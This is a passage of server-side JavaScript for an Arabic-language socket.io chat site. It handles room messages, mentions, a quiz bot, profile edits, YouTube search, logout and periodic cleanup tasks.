            } else if (UserInfo[socket.id]["ismuted"]) {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "إسكات",
                user: "",
              });
              return;
            } else if (
              UserInfo[socket.id]["rep"] < SiteSetting["maxlikeroom"]
            ) {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg:
                  SiteSetting["maxlikeroom"] + " عدد الايكات المطلوبة لدردشة ",
                user: "",
              });
              return;
            }

            const idmsg = stringGen(10);
            /* [ADDED] حساب الرسالة مرة واحدة والبث فوراً؛ الفلترة/المنشن/البوت بعد البث */
            const rawMsg = data["data"]["msg"];
            const cleanMsg = ReplaceEktisar(rawMsg);
            if (cleanMsg === undefined) {
              FilterChat(rawMsg);
              return;
            }
            io.to(UserInfo[socket.id]["idroom"]).emit(
              "SEND_EVENT_EMIT_SERVER",
              {
                cmd: "msg",
                data: {
                  bg: UserInfo[socket.id]["bg"],
                  copic: UserInfo[socket.id]["copic"],
                  mi: idmsg,
                 reply: SiteSetting["replay"]
                    ? data["data"]["reply"]
                      ? {
                          id: data["data"]["reply"]["id"],
                          msg: data["data"]["reply"]["msg"].slice(
                            0,
                            SiteSetting["lengthroom"]
                          ),
                          topic: data["data"]["reply"]["topic"]
                            .split("<")
                            .join("&#x3C;"),
                        }
                      : null
                    : null,
                  mcol: UserInfo[socket.id]["mcol"],
                  uid: UserInfo[socket.id]["id"],
                  msg: cleanMsg.slice(0, SiteSetting["lengthroom"]),
                  pic: UserInfo[socket.id]["pic"],
                  topic: UserInfo[socket.id]["topic"],
                  ucol: UserInfo[socket.id]["ucol"],
                },
              }
            );
			
            setImmediate(function () {
              if (!UserInfo[socket.id]) {
                return;
              }
              FilterChat(rawMsg);
            if (data["data"]["msg"].includes("@")) {
              const istag = OnlineUser.findIndex(
                (x) =>
                  x.topic == data["data"]["msg"].split("@")[1].split(" ")[0]
              );
              if (istag != -1) {
                if (UserInfo[OnlineUser[istag]["id"]]) {
                  if (
                    UserInfo[OnlineUser[istag]["id"]]["idroom"] ==
                      UserInfo[socket.id]["idroom"] &&
                    OnlineUser[istag]["id"] != socket.id
                  ) {
                    SendNotification({
                      id: OnlineUser[istag]["id"],
                      state: "to",
                      topic: UserInfo[socket.id]["topic"],
                      force: 1,
                      msg: "هذا المستخدم قام بلاشارة اليك",
                      user: socket.id,
                    });
                    io.to(OnlineUser[istag]["id"]).emit(
                      "SEND_EVENT_EMIT_SERVER",
                      { cmd: "vib", data: {} }
                    );
                  }
                }
              }
            }

			  if(data['data']['msg'].includes('برب') && BotBC['start'] && BotBC['isbot']){
      const BotPlayer = BotBC['player'].findIndex((x) => x.topic == UserInfo[socket.id]['topic']);
      if(BotPlayer != -1){
      BotBC['player'][BotPlayer]['point'] += 1;
      io.to(BotBC['room']).emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "msg",
              data: {
                numb: 1,
                mi: idmsg,
                uid: '',
                bg: "#fff",
				copic: 'none',
				reply:null,
                mcol: "#9c7fcf",
                msg: "<b>"+BotBC['player'][BotPlayer]['topic']+"<br><span style='color:#e53f3f'>"+BotBC['player'][BotPlayer]['point']+" عدد النقاط </span></b>",
                pic:'imgs/bootbrb.png',
                topic: 'بوت مسابقات برب',
                ucol: "#7a2fff"
            }});
            
    if(BotBC['player'][BotPlayer]['point'] == BotBC['nb']){
         io.to(BotBC['room']).emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "msg",
              data: {
                numb: 1,
				mi: idmsg,
                bg: "#fff",
                mcol: "#000",
				uid: '',
				copic: 'none',
				reply:null,
                msg: "<b>"+BotBC['player'][BotPlayer]['topic']+"<br><span style='color:#e53f3f'>مبروك فوز هذا المتسابق </span></b>",
                pic:'imgs/bootbrb.png',
                topic: 'بوت مسابقات برب',
                ucol: "#7a2fff"
            }});
      StopBotBrb();
        }else{
         setTimeout(()=>{
              BotBC['timestart'] = 0;
              BotBC['start'] = false;
            },1000);
        };
      }else{
      BotBC['player'].push({topic:UserInfo[socket.id]['topic'],point:1});
      io.to(BotBC['room']).emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "msg",
              data: {
                numb: 1,
				mi: idmsg,
                bg: "#fff",
                mcol: "#000",
				uid: '',
				copic: 'none',
				reply:null,
                msg: "<b>"+UserInfo[socket.id]['topic']+"<br><span style='color:#e53f3f'>1 عدد النقاط </span></b>",
                pic:'imgs/bootbrb.png',
                topic: 'بوت مسابقات برب',
                ucol: "#7a2fff"
			}});
            setTimeout(()=>{
              BotBC['timestart'] = 0;
              BotBC['start'] = false;
            },1000);
      };
    };
	

            });
          }
        } else if (data["cmd"] == "SEND_EVENT_EMIT_PPMSG") {
          if (UserInfo[socket.id]) {
            if (
              typeof data["data"]["msg"] == "string" &&
              typeof data["data"]["state"] == "string"
            ) {
              if (!GetPower(UserInfo[socket.id]["power"])["publicmsg"]) {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "ليس لديك صلاحية",
                  user: "",
                });
                return;
              } else if (UserInfo[socket.id]["ismuted"]) {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "إسكات",
                  user: "",
                });
                return;
              }

              io.emit("SEND_EVENT_EMIT_SERVER", {
                cmd: "ppmsg",
                data: {
                  bg: UserInfo[socket.id]["bg"],
                  copic: UserInfo[socket.id]["copic"],
                  id: UserInfo[socket.id]["id"],
                  class: data["data"]["state"] == "all" ? "pmsgc" : "ppmsgc",
                  mcol: UserInfo[socket.id]["mcol"],
                  topic: UserInfo[socket.id]["topic"],
                  msg: ReplaceEktisar(data["data"]["msg"]).slice(
                    0,
                    SiteSetting["lengthroom"]
                  ),
                  roomid: UserInfo[socket.id]["idroom"],
                  ucol: UserInfo[socket.id]["ucol"],
                  mi: stringGen(20),
                  pic: UserInfo[socket.id]["pic"],
                  uid: UserInfo[socket.id]["id"],
                },
              });
            }
          }
        } else if (data["cmd"] == "SEND_EVENT_EMIT_PROFILE") {
          if (UserInfo[socket.id]) {
            if (
              typeof data["data"]["bg"] != "string" ||
              typeof data["data"]["copic"] != "string" ||
              typeof data["data"]["ucol"] != "string" ||
              typeof data["data"]["topic"] != "string" ||
              typeof data["data"]["youtube"] != "string" ||
              typeof data["data"]["mcol"] != "string" ||
              typeof data["data"]["mscol"] != "string"
            ) {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "تأكد من صحة بياناتك",
                user: "",
              });
              return;
            } else if (
              !data["data"]["topic"].trim() &&
              data["data"]["topic"].length < 2 &&
              data["data"]["topic"].length > 30
            ) {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "الرجاء التاكد من الزخرفة",
                user: "",
              });
              return;
            } else if (isNaN(data["data"]["topic"]) == false) {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "الرجاء التاكد من الزخرفة",
                user: "",
              });
              return;
            } else if (
              UserInfo[socket.id]["rep"] < SiteSetting["maxlikename"]
            ) {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg:
                  SiteSetting["maxlikename"] +
                  " لتعديل بياناتك يجب ان يكون عدد الايكات",
                user: "",
              });
              return;
            } else if (data["data"]["msg"].length > 240) {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "لا يجب ان تتجاوز الحاله 240 حرفا",
                user: "",
              });
              return;
            } else if (
              UserInfo[socket.id]["rep"] < SiteSetting["maxlikename"]
            ) {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg:
                  SiteSetting["maxlikename"] +
                  " لتعديل بياناتك يجب ان يكون عدد الايكات",
                user: "",
              });
              return;
            } else {
              UsersRepo.getBy({
                state: "getByTopic",
                topic: data["data"]["topic"].trim(),
              }).then(function (topic) {
                if (
                  topic &&
                  topic["topic"] != UserInfo[socket.id]["topic"] &&
                  UserInfo[socket.id]["topic"] != data["data"]["topic"].trim()
                ) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "هذه الزخرفة مستخدمه",
                    user: "",
                  });
                  return;
                } else {
                  if (UserInfo[socket.id]) {
                    UserInfo[socket.id]["topic"] = data["data"]["topic"]
                      .trim()
                      .split("<")
                      .join("&#x3C;");
                    UserInfo[socket.id]["ucol"] = data["data"]["ucol"];
                    UserInfo[socket.id]["mcol"] = data["data"]["mcol"];
                    UserInfo[socket.id]["mscol"] = data["data"]["mscol"];
                    UserInfo[socket.id]["copic"] = data["data"]["copic"];
                    UserInfo[socket.id]["bg"] = data["data"]["bg"];
                    if (UserInfo[socket.id]["uid"]) {
                      UsersRepo.updateBy({
                        state: "updateProfile",
                        uid: UserInfo[socket.id]["uid"],
                        bg: data["data"]["bg"],
                        copic: data["data"]["copic"],
                        ucol: data["data"]["ucol"],
                        topic: data["data"]["topic"].split("<").join("&#x3C;"),
                        youtube: data["data"]["youtube"].split("<").join("&#x3C;"),
                        mcol: data["data"]["mcol"],
                        mscol: data["data"]["mscol"],
                        msg: ReplaceEktisar(data["data"]["msg"]),
                      });
                    }
                  }
                  const updateProfile = OnlineUser.findIndex(
                    (x) => x.id == socket.id
                  );
                  if (updateProfile != -1) {
                    OnlineUser[updateProfile]["bg"] = data["data"]["bg"];
                    OnlineUser[updateProfile]["copic"] = data["data"]["copic"];
                    OnlineUser[updateProfile]["ucol"] = data["data"]["ucol"];
                    OnlineUser[updateProfile]["topic"] = data["data"]["topic"].split("<").join("&#x3C;");
                    OnlineUser[updateProfile]["youtube"] = data["data"]["youtube"].split("<").join("&#x3C;");
                    OnlineUser[updateProfile]["mcol"] = data["data"]["mcol"];
                    OnlineUser[updateProfile]["mscol"] = data["data"]["mscol"];
                    OnlineUser[updateProfile]["msg"] = ReplaceEktisar(
                      data["data"]["msg"]
                    );
                    io.emit("SEND_EVENT_EMIT_SERVER", {
                      cmd: "u^",
                      data: OnlineUser[updateProfile],
                    });
                  }
                }
              });
            }
          }
        }else if(data['cmd'] == "botbrb"){
          if (UserInfo[socket.id]) {
              if(!GetPower(UserInfo[socket.id]['power'])['bootedit']){
                return
              };
              if(typeof data['data']['l'] != 'number' && typeof data['data']['msg'] != 'string' && data['data']['room'] != 'string' ){
                return;
              };
              if(data['data']['msg'] == 'start'){
                if(BotBC['isbot'] ){
                SendNotification({state:'me',topic: "", force: 1, msg:"بوت مسابقات برب شغال الأن", user: ""});
                  return; 
                 };
BotBC['isbot'] = true;
BotBC['room'] = data['data']['room'];
BotBC['nb'] = (data['data']['l'] == 0 ? 5 : data['data']['l']);
io.to(data['data']['room']).emit("SEND_EVENT_EMIT_SERVER", {
cmd: "msg",
data: {
numb: 1,
bg: "#fff",
copic: 'none',
reply:null,
mcol: "#e53f3f",
msg: "تم تشغيل بوت برب",
pic:'imgs/bootbrb.png',
topic: 'بوت مسابقات برب',
ucol: "#7a2fff",
uid: "",
roomid: data['data']['room']
}});

io.emit("SEND_EVENT_EMIT_SERVER", {cmd: "brbstate",data:1});
bottime = setInterval(()=>{
if(BotBC['timestart'] == BotBC['timestop'] && !BotBC['start']){
BotBC['start'] = true;
}else{
if(BotBC['timestart'] < 3){
BotBC['timestart'] += 1;
io.to(data['data']['room']).emit("SEND_EVENT_EMIT_SERVER", {
cmd: "msg",
data: {
numb: 1,
bg: "#fff",
mcol: "#9c7fcf",
msg: "<b>إستعداد لبدء برب<br><span style='color:#e53f3f'>"+BotBC['timestart']+"</span></b>",
pic:'imgs/bootbrb.png',
topic: 'بوت مسابقات برب',
	copic: 'none',
				reply:null,
ucol: "#7a2fff",
uid: "",
roomid: data['data']['room']
}});
};
};
},1000);
}else if(data['data']['msg'] == 'stop'){
if(!BotBC['isbot'] ){
SendNotification({state:'me',topic: "", force: 1, msg:"بوت مسابقات برب لم يبدء بعد لإيقافه", user: ""});
 return; 
};
io.to(BotBC['room']).emit("SEND_EVENT_EMIT_SERVER", {cmd: "msg",data: {
numb: 1,
uid: '',
bg: "#fff",
mcol: "#9c7fcf",
msg: "تم إيقاف بوت برب",
pic:'imgs/bootbrb.png',
	copic: 'none',
				reply:null,
topic: 'بوت مسابقات برب',
ucol: "#7a2fff",
roomid: BotBC['room']
}});
StopBotBrb();
};
};
        } else if (data["cmd"] == "SEND_EVENT_EMIT_TYPING") {
          if (typeof data["data"]["id"] == "string") {
            socket.to(data["data"]["id"]).emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "typing",
              data: socket.id,
            });
          }
        } else if (data["cmd"] == "SEND_EVENT_EMIT_STOP_TYPING") {
          if (typeof data["data"]["id"] == "string") {
            socket.to(data["data"]["id"]).emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "stopTyping",
              data: socket.id,
            });
          }
        } else if (data["cmd"] == "SEND_EVENT_EMIT_YOUTUBE") {
          if (!UserInfo[socket.id]) {
            return;
          }
          if (typeof data["data"]["search"] != "string") {
            return;
          }
          var ytq = data["data"]["search"].trim();
          if (!ytq) {
            return;
          }
          var ytnow = Date.now();
          if (socket.ytLast && ytnow - socket.ytLast < 1500) {
            socket.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "youtube_results",
              data: { q: ytq, list: [], err: "wait" },
            });
            return;
          }
          socket.ytLast = ytnow;
          searchYoutube(ytq, 6)
            .then(function (result) {
              socket.emit("SEND_EVENT_EMIT_SERVER", {
                cmd: "youtube_results",
                data: { q: ytq, list: result || [] },
              });
            })
            .catch(function (e) {
              console.log("youtube search error:", e && e.message);
              socket.emit("SEND_EVENT_EMIT_SERVER", {
                cmd: "youtube_results",
                data: { q: ytq, list: [], err: "fail" },
              });
            });
        } else if (data["cmd"] == "SEND_EVENT_EMIT_LOGOUT") {
          if (UserInfo[socket.id]) {
            if (!UserInfo[socket.id]["ismsg"]) {
              if (
                GetPower(UserInfo[socket.id]["power"])["stealth"] &&
                UserInfo[socket.id]["stealth"]
              ) {
              } else {
                UserInfo[socket.id]["logout"] = true;
                MessagesList({
                  state: "LogsMsg",
                  bg: "none",
                  copic: "none",
                  class: "hmsg",
                  id: UserInfo[socket.id]["id"],
                  topic: UserInfo[socket.id]["topic"],
                  msg: "( تسجيل خروج )",
                  idroom: UserInfo[socket.id]["idroom"],
                  pic: UserInfo[socket.id]["pic"],
                });
              }
              UserDisconnect({ id: socket.id, state: 1 });
            }
          }
        }
      } catch (e) {
        return;
      }
    }
  });
});
http.on("error", function (err) {
  console.log("Server error: " + (err && err.message));
});

/* الاستضافة تحدد البورت عبر PORT، ويجب الاستماع على 0.0.0.0 */
http.listen(Config.Port, "0.0.0.0", function () {
  console.log("Server started on port " + Config.Port);
  StartServer();
  setInterval(function () {
    UserChecked = [];
  }, 60000 * 60 * 24);
  setInterval(function () {
    BackUpDataBase();
  }, Config.Backup);
  setTimeout(() => {
    MessageDay();
    botauto();
  }, 1000 * 10);
  	setInterval(function () {
                rimraf("uploads/sendfile", () => {
			   if (!fs.existsSync("uploads/sendfile")) {
				   fs.mkdirSync("uploads/sendfile");
				  }
			});
	}, 60000 * 60 * 15);
  setInterval(function () {
    if (BandRoom.length > 0) {
      BandRoom = [];
    }

    if (ListWait.length > 0) {
      ListWait = [];
    }

    StoryRepo.getBy({ state: "getAllIn" }).then((str) => {
      for (var i = 0; i < str.length; i++) {
        if (
          new Date(str[i]["date"]).toISOString().split("T")[0] <
          new Date().toISOString().split("T")[0]
        ) {
          io.emit("SEND_EVENT_EMIT_SERVER", {
            cmd: "story-",
            data: str[i]["id"],
          });
          StoryRepo.deletedBy(str[i]["id"]);
          fs.unlink("uploads" + str[i]["url"], (err) => {
            if (err) {
            }
          });
        }
		(function anonymous(
) {
})
      }
    });
  }, 60000 * 5);
});

/* إغلاق نظيف عند إعادة نشر الخدمة (Render / Railway / Docker) */
process.on("SIGTERM", function () {
  console.log("SIGTERM received, closing server...");
  try {
    io.close();
  } catch (e) {}
  http.close(function () {
    process.exit(0);
  });
  setTimeout(function () {
    process.exit(0);
  }, 8000);
});